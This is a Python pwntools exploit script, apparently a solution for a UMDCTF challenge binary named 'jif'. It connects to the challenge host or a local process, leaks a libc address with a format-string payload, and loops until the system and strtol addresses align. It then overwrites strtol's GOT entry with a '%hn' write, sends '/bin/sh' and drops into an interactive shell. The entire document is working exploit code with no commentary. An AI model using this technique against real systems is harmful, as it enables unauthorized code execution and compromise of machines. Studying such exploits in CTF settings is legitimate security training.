#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./jif')

while True:
	if args.REMOTE:
		p = remote('chals5.umdctf.io', 7002)
		libc = ELF('./libc6_2.27-3ubuntu1.4_amd64.so')
		__libc_start_main_offset = 231
	else:
		p = process(binary.path)
		libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
		__libc_start_main_offset = 243

	payload  = b''
	payload += 272 * b'A'
	payload += b'%51$p'

	p.sendlineafter('CONSOLE> ',payload)

	p.recvuntil('Current location: ')
	_ = p.recvline().strip()
	__libc_start_main = int(_,16) - __libc_start_main_offset
	log.info('__libc_start_main: ' + hex(__libc_start_main))
	libc.address = __libc_start_main - libc.sym.__libc_start_main
	log.info('libc.address: ' + hex(libc.address))

	if (libc.sym.system >> 16 == libc.sym.strtol >> 16):
		break
	else:
		p.close()
		continue

log.info('system.address: ' + hex(libc.sym.system))
log.info('strtol.address: ' + hex(libc.sym.strtol))

payload  = b''
payload += 272 * b'A'
payload += b'%' + str(libc.sym.system & 0xFFFF).rjust(6,'0').encode() + b'c'
payload += b'%0018$hn'
payload += p64(binary.got.strtol)

p.sendlineafter('CONSOLE> ',payload)
p.sendlineafter('CONSOLE> ','/bin/sh')
p.interactive()
